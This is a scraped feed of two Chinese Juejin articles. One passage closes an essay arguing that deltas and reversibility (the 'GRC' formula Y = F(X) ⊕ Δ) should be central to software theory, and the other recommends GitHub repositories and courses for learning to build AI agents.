<li>核心演化与客户差异被分解在不同 Δ 子空间。</li>
</ul>
</li>
</ul>
<p>换句话讲：</p>
<blockquote>
<p>这条公式把“构造”和“演化”统一成<strong>同一种操作</strong>：叠加 Δ。</p>
</blockquote>
<ul>
<li>构造（生成）和演化（定制）只是在不同层、不同坐标系上的 Δ 叠加；</li>
<li>复杂系统 = 多层 Generator + 多层 Δ 的纵横递归分解。</li>
</ul>
<h3 data-id="heading-15">4.2 一切皆差量（Everything is a Delta）</h3>
<p>在有幺元的代数结构里，任何对象都可以被看成：</p>
<blockquote>
<p>A = 0 ⊕ A</p>
</blockquote>
<p>所以在软件世界里，完全可以这样看：</p>
<ul>
<li>“一个完整系统”本身就是从“无”到“有”的一大坨 Δ_genesis；</li>
<li>所有后续修改都是在这坨 Δ 上继续叠加更多 Δ；</li>
<li>克隆 + 修改一个系统，其实是“对现有系统应用一个 Δ_clone”。</li>
</ul>
<p>于是，“一切皆差量”不是口号，而是：</p>
<blockquote>
<p>把“全量”视为“相对于单位元的一次 Δ”。</p>
</blockquote>
<p>在这个视角下，语言、DSL、工具，都需要回答三个问题：</p>
<ol>
<li>它的结构空间 S 是什么？</li>
<li>在 S 上，差量 Δ 的基本“语法单位”是什么？</li>
<li>⊕ 的代数性质是什么（封闭、结合、单位元、局部逆等）？</li>
</ol>
<p>只有回答了这三个问题，才算在这门语言/模型上真正具备“演化的理论”。</p>
<h3 data-id="heading-16">4.3 引入可逆性：用逆元来控制熵增</h3>
<p>从物理学中，我们知道：</p>
<ul>
<li>熵增是不可避免的；</li>
<li>但可逆过程熵保持不变，越不可逆，熵增越大。</li>
</ul>
<p>在软件世界里，完全一样：</p>
<ul>
<li>每次临时 hack、耦合、不结构化改变，都在增加系统“混乱度”；</li>
<li>一定时间后，就演变为“没人敢动”的遗产代码。</li>
</ul>
<p>可逆计算提出：</p>
<ul>
<li>尽量让每个局部操作都有配对的逆操作；</li>
<li>如果各个局部可逆，且组合关系也可逆，则整体可逆；</li>
<li>可逆性越强，系统演化时“结构信息”的损耗越小，相当于熵增受控。</li>
</ul>
<p>在软件实践中，这具体落地为：</p>
<ul>
<li>差量 Δ 尽量是可逆的；</li>
<li>合并 ⊕ 重视“如何可拆解/回滚某个 Δ”；</li>
<li>客户定制、行业特化，尽量集中到可剥离、可抛弃的 Δ_customer 中，而不是侵入核心。</li>
</ul>
<p>这与“把熵增集中在差量里”的想法对应：</p>
<blockquote>
<p>核心模型保持低熵，客户的随机性、偶然性集中在一个可分离的差量层中。</p>
</blockquote>
<p>所以：</p>
<ul>
<li>可逆性不只是“方便 undo”，</li>
<li>而是<strong>延缓和局限熵增，延长系统可维护寿命的手段</strong>。</li>
</ul>
<h3 data-id="heading-17">4.4 与 DDD / MDA / SPL 的统一解释</h3>
<p>GRC 并不是要推翻已有方法，而是给出统一解释：</p>
<ul>
<li>MDA：<br/>
传统 <code>App = Transformer(Model)</code> → GRC 中是 <code>App = Generator(Model) ⊕ Δ</code>，<br/>
生成与定制统一，解决模型与代码割裂问题。</li>
<li>SPL / 复用：<br/>
从 “A &gt; B（继承）”、“A = B + C（组件）”<br/>
到 “B = A + (-C)” 和 <code>Base ⊕ Δ_Industry ⊕ Δ_Region ⊕ Δ_Customer</code>，<br/>
让“相关即可复用”，并隔离核心产品与定制演化。</li>
<li>DDD：<br/>
在“空间-时间-语言-变化”四维上重读 DDD：
<ul>
<li>空间：限界上下文是相对空间，防腐层是坐标变换；</li>
<li>时间：领域事件是状态空间上的差量 Δ（<code>NewState = OldState ⊕ Event</code>）；</li>
<li>语言：通用语言 / DSL 是坐标系；</li>
<li>变化：演化是在坐标系上任意点的扰动。</li>
</ul>
</li>
</ul>
<p>研究重点转向：</p>
<ul>
<li>如何设计 F（生成器）让基态结构尽可能“简单、规范、语义清晰”；</li>
<li>如何设计 Δ 的数据结构和 ⊕ 的代数性质，让演化可组合、可回滚、可合并、局部可逆。</li>
</ul>
<p>这其实是在软件工程中引入一套“离散微积分”：局部微扰（Δ）、路径积分（⊕ 的迭代）、局部逆（可撤销的变更），从而有机会用熵、可逆性等概念来刻画演化质量。</p>
<h3 data-id="heading-18">4.5 多 DSL / 多模型 / 多表象：一个“模型空间 Atlas”</h3>
<p>现实中你会有：</p>
<ul>
<li>领域 DSL（业务规则、工作流、权限等）；</li>
<li>数据模型 DSL（ORM、schema）；</li>
<li>UI DSL；</li>
<li>配置 DSL；</li>
<li>Excel 表格、可视化编辑器作为另一种表象。</li>
</ul>
<p>可逆计算视角下：</p>
<ul>
<li>它们是同一语义世界的不同坐标系；</li>
<li>语言工作台的统一元模型（XDef）给出“共同的结构空间”；</li>
<li>利用 lens/BX/transform 在不同表象之间进行可逆（或可控损失）的变换；</li>
<li>每个表象下的 Δ 可以通过 transform 映射到 canonical 结构空间中的 Δ。</li>
</ul>
<p>这就把：</p>
<ul>
<li>MDA、Xtext、语言工作台、DSL 工程；</li>
<li>BX/lens、模型同步；</li>
<li>Excel/GUI 与文本/AST 的互转；</li>
</ul>
<p>都统一到一张更大的图景里：<br/>
<strong>一个多坐标系的模型空间 Atlas，上面运行着 Δ 与 ⊕ 的演化。</strong></p>
<p>GRC 在实践中通过“语言工作台”体现这一点：</p>
<ul>
<li><strong>统一元模型（XDef）</strong>：所有 DSL 基于同一元模型定义，实现无缝嵌入与协同。</li>
<li><strong>内置差量机制（x-extends）</strong>：变化在 DSL 层就是一等公民，保证各 DSL 间合并语义一致。</li>
<li><strong>多重表象</strong>：同一模型可以在 XML / JSON / Excel / 可视化设计器间无损转换，实现“推导 + 修正”的工作模式：
<ul>
<li>推导：从规范 DSL 自动生成 artifact；</li>
<li>修正：通过 Δ 对生成结果做非侵入式补充和微调。</li>
</ul>
</li>
</ul>
<p>如果这套用法成为主流，我们会自然把：</p>
<ul>
<li>各种模型空间（DSL、Excel、JSON、可视视图…）</li>
<li>各种表象之间的变换（解析、生成、编辑器）</li>
<li>差量在各表象之间的对应</li>
</ul>
<p>统一到“范畴/函子/伴随”这个层次上。<br/>
而不是继续把范畴锁在类型世界里。这更符合范畴论的本义。</p>
<p>例如：</p>
<ul>
<li>把 Excel 文件空间看作一个范畴；</li>
<li>把 DSL 模型空间看作另一个范畴；</li>
<li>定义一个 Generic 的解析器，作为从 Excel 范畴到 DSL 范畴的模型解析函子；</li>
<li>再定义一个从 DSL 到 Excel 的Report导出函子，形成一对伴随。</li>
</ul>
<p>一个好的可视化 Editor: Model → View，本质上应该是一个保差量结构的函子，满足 Editor(Base ⊕ Ext) ≈ Editor(Base) ⊕ Editor(Ext) 这种同态性质，这样 Δ 在视图层也能干净分解、可逆回到模型</p>
<h2 data-id="heading-19">五、回到原问题：真正严重的缺陷是什么？</h2>
<p>现在可以比较精确地回答：“目前 PL / SE 研究中真正严重的缺陷是什么？”</p>
<h3 data-id="heading-20">5.1 缺陷不在某个技术分支，而在“世界观层级选错了”</h3>
<p>当前体系把“软件科学的主峰”设在：</p>
<blockquote>
<p>如何定义和验证一个程序 P（静态安全、语义正确、行为可预测）。</p>
</blockquote>
<p>但现实中最难、最关键的问题，是：</p>
<blockquote>
<p>如何系统地定义、操作、推理一整个程序族及其长期演化，<br/>
即：{P₀, P₁, …, Pₙ} 与 {Δ₁, Δ₂, …, Δₙ} 的结构。</p>
</blockquote>
<p>这个层级被严重低估了，且被“外包”给工程实践。</p>
<h3 data-id="heading-21">5.2 差量（Δ）与可逆性没有被当作“数学一等公民”</h3>
<p>我们有：</p>
<ul>
<li>成熟的类型论处理静态安全；</li>
<li>熟练的形式方法处理“一个版本”的正确性；</li>
<li>零散的 delta-oriented programming、SPL、BX 等各自讲自己的 Δ。</li>
</ul>
<p>但我们没有的是：</p>
<ul>
<li>一门类似“类型论之于静态安全”的**“变化科学”**；</li>
<li>明确以 Δ、⊕、可逆性、熵增、演化轨迹为对象的主流理论主线。</li>
</ul>
<p>存在各种零散的Δ，但语义不统一、公理不清晰、层次混乱。<br/>
学界在这上面的系统化抽象严重滞后于工程实际需求。<strong>差量与合并没有被当成“数学对象”，而只是工程工具</strong></p>
<p>GRC 并不是在现有理论之上“再补一个工具层”，而是试图把 Δ/⊕、可逆性、熵增控制，提升到和类型论同一层级的“基础理论组成部分</p>
<h3 data-id="heading-22">5.3 对“软件世界”的理解仍停留在“粒子视角”，缺少“波动/场视角”</h3>
<p>今天的主流视角是：</p>
<ul>
<li>基本单元：对象、模块、组件（粒子）；</li>
<li>关注的是：这个对象是什么，这个模块有什么接口。</li>
</ul>
<p>可逆/差量导向的视角更像“波动/场”：</p>
<ul>
<li>基本单元：结构空间 + 场上的扰动（Δ）；</li>
<li>关注的是：在什么坐标系下发生了什么变化，这些变化如何叠加、相消。</li>
</ul>
<p>这两种视角不是非此即彼，但目前学界几乎全在“粒子侧”，<br/>
“波动/场”侧还远远没有被系统发展。</p>
<h3 data-id="heading-23">5.4 多模型、多 DSL、多表象协同缺乏统一空间观</h3>
<p>现实中的大型系统演化，越来越是“多模型、多视图、多 DSL 的协同演化”。<br/>
而这一块，目前主要依靠：</p>
<ul>
<li>工具链各自做一点转换；</li>
<li>工程师在各层之间人肉同步；</li>
<li>版本久了就失去一致性。</li>
</ul>
<p>缺乏一个统一的“模型空间 + 差量传播”理论来统摄。</p>
<h2 data-id="heading-24">六、最后：这篇回答想表达的立场</h2>
<ul>
<li>
<p>并不是说“类型论、范畴论、形式方法都不重要”，而是：<br/>
它们解决的是“静态正确性 + 局部计算”的问题，而且在“变换本位”的世界观下被用得过于狭窄。</p>
</li>
<li>
<p>真正被低估、也被理论界“外包给工程经验”的，是：</p>
<ul>
<li>生成 + 演化统一建模（Y = F(X) ⊕ Δ）；</li>
<li>差量代数（Δ 的结构与 ⊕ 的公理）；</li>
<li>多表象、多模型之间的可逆变换与差量传播；</li>
<li>程序结构空间的“几何与场”视角（坐标、局部扰动、路径积累）；</li>
<li>用可逆性和熵的视角来理解和控制软件演化。</li>
</ul>
</li>
<li>
<p>这些部分，目前更多是由：</p>
<ul>
<li>Git、迁移脚本、配置系统、脚手架、内嵌 DSL；</li>
<li>架构经验和团队约定；
在支撑，却没有一套像类型/逻辑那样统一、可组合的理论基础。</li>
</ul>
</li>
</ul>
<p>所以，如果要回答“现有研究有哪些严重缺陷”，可以说：</p>
<blockquote>
<p>“严重”并不在于某个技术分支做错了，而在于整个学界的视角在层级上错位——<br/>
把“单个程序的静态安全”当成了软件科学的主峰，而把“变化本身”放在理论视野之外。</p>
<p>而广义可逆计算（GRC）给出了一个候选答案：<br/>
把软件理解为在结构空间上叠加差量场，<br/>
用 <code>Y = F(X) ⊕ Δ</code> 这条方程，把构造与演化统一起来，把可逆性与熵增控制纳入软件理论的基本目标，
让差量（Δ）和合并（⊕）从工程苦工，回到可公理化、可组合、可推理的数学对象。</p>
</blockquote>
<p>参考：</p>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fxao9AKlOST0d97ztuU3z9Q" target="_blank" title="https://mp.weixin.qq.com/s/xao9AKlOST0d97ztuU3z9Q" ref="nofollow noopener noreferrer">DDD本质论:从哲学到数学，再到工程实践的完整指南之理论篇</a>: 结合（广义）可逆计算理论，从哲学、数学到工程层面，系统性地剖析了DDD（领域驱动设计）的技术内核，认为其有效性背后存在着数学必然性。</p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FpNXPEvyVB7ljOhBQVh6c-A" target="_blank" title="https://mp.weixin.qq.com/s/pNXPEvyVB7ljOhBQVh6c-A" ref="nofollow noopener noreferrer">广义可逆计算: 一个软件构造范式的正名与阐释</a>:为“广义可逆计算”（GRC）正名，阐释了其核心思想——以“差量”（Delta）为第一类公民，系统性地管理软件构造过程中的可逆性与不可逆性，旨在解决“复杂性”这一核心工程难题。</p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZu80p-8HtfXi7O-IPK5Wxw" target="_blank" title="https://mp.weixin.qq.com/s/Zu80p-8HtfXi7O-IPK5Wxw" ref="nofollow noopener noreferrer">(广义)可逆计算理论速览-统一软件构造与演化的新范式</a>: 提供了（广义）可逆计算理论的快速概览，总结了其核心公式 <code>App = Delta x-extends Generator&lt;DSL&gt;</code>、对传统理论（如模型驱动架构）的继承与发展，以及关键技术实现。</p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FiZWcRa_Af8Io6AAUXd-0Vg" target="_blank" title="https://mp.weixin.qq.com/s/iZWcRa_Af8Io6AAUXd-0Vg" ref="nofollow noopener noreferrer">让演化可编程：XLang 与可逆计算的结构化范式</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhbNiy3E7-JH8_SXpN2EOXg" target="_blank" title="https://mp.weixin.qq.com/s/hbNiy3E7-JH8_SXpN2EOXg" ref="nofollow noopener noreferrer">模型驱动架构的数学内核：统一生成与演化的 Y = F(X) ⊕ Delta 不变式</a></p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[建议去 GitHub 学这 6 个项目，打破 Agent 的信息差。]]></title>    <link>https://juejin.cn/post/7581769891498508307</link>    <guid>https://juejin.cn/post/7581769891498508307</guid>    <pubDate>2025-12-10T02:46:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581769891498508307" data-draft-id="7581689310644502570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="建议去 GitHub 学这 6 个项目，打破 Agent 的信息差。"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-12-10T02:46:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="逛逛GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            建议去 GitHub 学这 6 个项目，打破 Agent 的信息差。
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    逛逛GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:46:15.000Z" title="Wed Dec 10 2025 02:46:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025年，毫无疑问将是 Agent（智能体）元年，GitHub 上无疑是非常重要的一个学习平台，上面有很多宝藏教程。今天推荐几个 Agent 学习开源项，，感兴趣的可以先收藏本文，方便后面回顾。</p>
<h2 data-id="heading-0">01、Hello-Agents</h2>
<p>国内社区 Datawhale 开源的教程，GitHub 上有 5700+ Star。</p>
<p>这个教程既能带你深入底层原理，又能手把手带你写出能跑的 Agent 代码。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/487c29c55b984dae8773370c97298000~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=cmN339PLXZrz9D8ZH8FSjqEUcLQ%3D" alt="图片" loading="lazy"/></p>
<p>它不仅仅是一个代码仓库，更像是一本<strong>互动式的教科书</strong>。帮你从一名大模型的使用者，蜕变为一名智能体系统的构建者。</p>
<p>这个开源项目内容很丰富，不像很多教程上来就让你调 LangChain 的接口。</p>
<p>Hello-Agents 非常硬核，它会带你手搓框架：不依赖现成库，用原生OpenAI API 从零构建一个 Agent 框架。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e306cbb9c6c44fddb7f563ee2db16952~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=nWRdKKhwAYKrO7%2F7HFGoQR0B4lI%3D" alt="图片" loading="lazy"/></p>
<p>彻底理解 ReAct（推理+行动）、Plan-and-Solve、Reflection（反思）这些经典范式是如何在代码层面实现的。</p>
<p>只有当你亲手造过轮子，你才能真正理解轮子是怎么转的。</p>
<p>另外这个开源项目还教你使用 Coze、Dify、n8n 等平台快速搭建应用，适合快速验证想法。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/230369ab362d4d0d9d4f1148a74928ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=9x7cR9SOrwm%2FMI21myKzs55HKEA%3D" alt="图片" loading="lazy"/></p>
<p>除此之外，Hello-Agents 还能深入 LangGraph 等主流框架，讲解如何用代码控制复杂的 Agent 工作流。</p>
<p>还教你如何让 Agent 拥有长期记忆；实现多智能体协作 (Multi-Agent)；了解 RAG 与上下文工程，让 Agent 精准利用外部知识库。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e992adf13001438a80e34d647c0aacde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=LWapZ%2FM%2BDI7QxF6eMwlu5apz5V0%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/datawhalechina/hello-agents</span>
</code></pre>
<h2 data-id="heading-1">02、500+ 智能体案例</h2>
<p>500-AI-Agents-Projects 是 GitHub 上一个涵盖了超过 500 个 AI Agent 落地案例的超级目录，斩获 18k+ Star。</p>
<p>与纯粹的代码教程不同，它更像是一本行业应用指南，按医疗、金融、教育、DevOps 等垂直领域对 Agent 项目进行了详细分类。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d8ccdbe42104cb5b3e79e887d708402~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=Kptd7waeZ%2BwEQ9o0Py65OkaWECg%3D" alt="图片" loading="lazy"/></p>
<p>开源项目收录了大量开源代码和实际用例，无论你是想开发一个自动化营销助手，还是医疗诊断辅助系统，都能在这里找到现成的参考案例。</p>
<p>帮助开发者和产品经理跳出聊天机器人的思维定势，发现 AI 在细分领域的落地。</p>
<p>包括 CrewAI、Autogen、Agno、Langgraph 等主流框架的实际应用。<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b262da028db4889be74554fe8e3191c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=I5RS5unp2ZwagRhba3RP%2BI2BJSk%3D" alt="图片" loading="lazy"/></p>
<p>如果你想知道别人都在用 AI Agent 搞什么，或者想在动手开发前参考现有的最佳实践以避免重复造轮子，那么来这个仓库瞧瞧就行了。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/ashishpatel26/500-AI-Agents-Projects</span>
</code></pre>
<h2 data-id="heading-2">03、智能体资源库</h2>
<p>国外 AI 技术博主 <strong>Nir Diamant</strong> 大佬开源的：<strong>GenAI_Agents</strong>。</p>
<p>通过极其清晰的路径，手把手教你从零构建智能体。汇集了 <strong>40 多种不同场景的 AI 智能体实现，</strong></p>
<p>无论你是想做一个简单的问答机器人，还是想利用当红框架 <strong>LangGraph</strong> 搭建复杂的、具备记忆和自我反思能力的多智能体系统，这里都有现成的最佳实践。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5002e0eed58f4210932255288228e99c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=6Nnep1GHL6sEVbTBZ43rhTtXMLw%3D" alt="图片" loading="lazy"/></p>
<p>这个项目最大的亮点在于实战为王，包含了大量可直接运行的 Jupyter Notebook 教程，覆盖了从入门到精通的全方位场景。</p>
<p>项目按难度分级，新手可以从基础对话 Agent 入手，逐步进阶到复杂的多智能体系统架构。</p>
<p>每个智能体都提供完整的实现代码和详细说明，你可以直接克隆项目，快速复现效果。</p>
<p>集成了 LangChain、LangGraph、AutoGen 等主流框架，以及 MCP 等先进技术。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/NirDiamant/GenAI_Agents</span>
</code></pre>
<h2 data-id="heading-3">04、HF开源的 Agent 教程</h2>
<p>Hugging Face 官方开源了他们的智能体课程：Agents Course。</p>
<p>当你完成所有章节和 Final Project 后，你还能获得一张 <strong>Hugging Face 官方颁发的结业证书</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6faf174e6cab4db68ebce3795689466c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=%2FmlKaqcqRPfCNS%2Fr%2Fazi2As1CGU%3D" alt="图片" loading="lazy"/></p>
<p>我发现 Hugging Face 确实是在通过这门课推广新框架 smolagents。</p>
<p>他们发现现在的 Agent 开发越来越重了，动不动就是复杂的图、复杂的 Chain。它的核心理念是：<strong>Code Agents</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a6ea321eba348d4980f89fc3683a98f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=4T%2Bldjvo4%2BMvHjSBgWVxHbJruTk%3D" alt="图片" loading="lazy"/></p>
<p>简单说，<strong>让 LLM 直接写 Python 代码来解决问题</strong>，而不是让它输出一堆复杂的 JSON 格式去调用工具。</p>
<p>这种方式更直观、更强大，而且代码量只有其他框架的几分之一。这门课会带你掌握这种小而美的开发方式。</p>
<p>同样的，这个 Agents 项目也包含极其有趣的实战案例，教你训练一个能玩宝可梦游戏的智能体。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/685f48cb3d764e4cbe50bcc84085a8ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=p3cyFDMuGm5V%2B2lEI52Z2tQ9khc%3D" alt="图片" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<p>依托于 Hugging Face 强大的生态，这门课所有的练习都可以在 Hugging Face Spaces 上直接运行。</p>
